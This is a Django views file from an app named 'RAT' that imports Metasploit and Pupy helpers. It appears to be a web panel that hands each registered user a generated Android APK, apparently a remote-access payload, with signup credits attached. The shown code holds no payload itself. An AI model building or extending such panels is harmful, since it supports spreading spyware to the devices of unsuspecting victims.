from django.shortcuts import render, redirect,get_object_or_404
from RAT import models
from django.http import HttpResponse, HttpResponseRedirect
from django.views import generic
from django.template import loader
import os, errno
from django.contrib.auth import login, authenticate
from django.contrib.auth.mixins import LoginRequiredMixin
from django.urls import reverse_lazy,reverse
from RAT.forms import SignUpForm
import subprocess
import gmplot
from django.http import JsonResponse
from .metasploit import *
from .pupy import *
from django.contrib.auth.mixins import LoginRequiredMixin

def index(request):
    """
    View function for home page of site.
    """


    # Render the HTML template index.html with the data in the context variable
    return render(
        request,
        'index.html',
        context={
        },
    )




def down(request):
    username = request.user.username
    dir = '/root/django/users/'+ str(username)+'/'+str(username)+'.apk'
    file_path = dir
    if os.path.exists(file_path):
        with open(file_path, 'rb') as fh:
            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
            return response
    raise Http404


def signup(request):
    if request.method == 'POST':
        form = SignUpForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get('username')
            raw_password = form.cleaned_data.get('password1')
            user = authenticate(username=username, password=raw_password)
            login(request, user)
            credit = models.Credit.objects.get(user=user)
            credit.number = 3
            credit.save()
            return redirect('RAT:index')
    else:
        form = SignUpForm()
    return render(request, 'signup.html', {'form': form})
